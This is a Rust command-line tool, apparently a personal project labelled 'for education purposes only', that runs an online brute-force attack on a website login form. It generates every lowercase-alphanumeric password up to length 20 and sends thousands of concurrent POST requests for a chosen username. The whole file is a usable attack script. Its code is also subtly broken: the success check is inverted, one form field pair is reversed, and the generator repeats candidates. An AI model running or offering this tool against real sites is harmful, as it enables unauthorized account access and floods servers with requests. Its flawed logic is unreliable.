use chrono::prelude::*;
use clap::{App, Arg};
use itertools::Itertools;

fn password_generator() -> impl Iterator<Item = String> {
    let charset: &str = "abcdefghijklmnopqrstuvwxyz0123456789";

    (1..=20)
        .flat_map(move |len| {
            charset
                .chars()
                .combinations_with_replacement(len)
                .map(move |combos| (combos, len))
        })
        .flat_map(|(combos, len)| combos.into_iter().permutations(len))
        .dedup()
        .map(|chars| chars.into_iter().collect())
}

async fn sending_requests(
    url: String,
    username: String,
    username_field: String,
    password_field: String,
    error_message: String,
) {
    let url = std::sync::Arc::new(url);
    let username = std::sync::Arc::new(username);
    let username_field = std::sync::Arc::new(username_field);
    let password_field = std::sync::Arc::new(password_field);
    let error_message = std::sync::Arc::new(error_message);
    let mut request_amount = 0;
    let mut tasks: Vec<tokio::task::JoinHandle<Result<(), ()>>> = Vec::new();

    for password in password_generator() {
        request_amount += 1;

        let url = url.clone();
        let username = username.clone();
        let username_field = username_field.clone();
        let password = std::sync::Arc::new(password);
        let password_field = password_field.clone();
        let error_message = error_message.clone();
        tasks.push(tokio::spawn(async move {
            let fields = [
                (username, username_field),
                (password_field, password.clone()),
            ];

            loop {
                match reqwest::Client::new()
                    .post(&*url)
                    .form(&fields)
                    .send()
                    .await
                {
                    Ok(resp) => match resp.text().await {
                        Ok(text) => {
                            if text.contains(&*error_message) {
                                println!(
                                    "[{}] Correct Password: '{}'",
                                    Utc::now().format("%Y-%m-%d %H:%M:%S").to_string(),
                                    password,
                                );

                                println!(
                                    "[{}] Request Amount: {}",
                                    Utc::now().format("%Y-%m-%d %H:%M:%S").to_string(),
                                    request_amount,
                                );
                                std::process::exit(1);
                            }

                            break;
                        }
                        Err(_) => {}
                    },
                    Err(_) => {}
                };
            }
            Ok(())
        }));

        if tasks.len() % 1000 == 0 {
            let tasks_length = tasks.len();

            println!(
                "[{}] Executing {} tasks",
                Utc::now().format("%Y-%m-%d %H:%M:%S").to_string(),
                &tasks_length
            );
            futures::future::join_all(tasks).await;

            tasks = Vec::new();
        }
    }
}

#[tokio::main]
async fn main() {
    let matches = App::new("Brute Force Attack")
        .author("Frolov Ivan <frolvanya@gmail.com>")
        .about("FOR EDUCATION PURPOSES ONLY")
        .arg(
            Arg::with_name("url")
                .short("u")
                .long("url")
                .value_name("URL")
                .help("Sets a website url")
                .takes_value(true),
        )
        .arg(
            Arg::with_name("username")
                .short("l")
                .long("login")
                .value_name("USERNAME")
                .help("Sets an username")
                .takes_value(true),
        )
        .arg(
            Arg::with_name("username_field")
                .long("username-field")
                .value_name("USERNAME_FIELD")
                .help("Sets an username field")
                .takes_value(true),
        )
        .arg(
            Arg::with_name("password_field")
                .long("password-field")
                .value_name("PASSWORD_FIELD")
                .help("Sets a password field")
                .takes_value(true),
        )
        .arg(
            Arg::with_name("error_message")
                .short("e")
                .long("err")
                .value_name("ERROR_MESSAGE")
                .help("Sets an authentication error message")
                .takes_value(true),
        )
        .get_matches();

    let website_url: &str = matches.value_of("url").unwrap();
    let username: &str = matches.value_of("username").unwrap();
    let username_field: &str = matches.value_of("username_field").unwrap();
    let password_field: &str = matches.value_of("password_field").unwrap();
    let error_message: &str = matches.value_of("error_message").unwrap();

    println!(
        "[{}] Starting Brute Force Attack",
        Utc::now().format("%Y-%m-%d %H:%M:%S").to_string(),
    );

    println!(
        "{} {} {} {} {}",
        website_url, username, username_field, password_field, error_message
    );

    sending_requests(
        website_url.to_string(),
        username.to_string(),
        username_field.to_string(),
        password_field.to_string(),
        error_message.to_string(),
    )
    .await
}
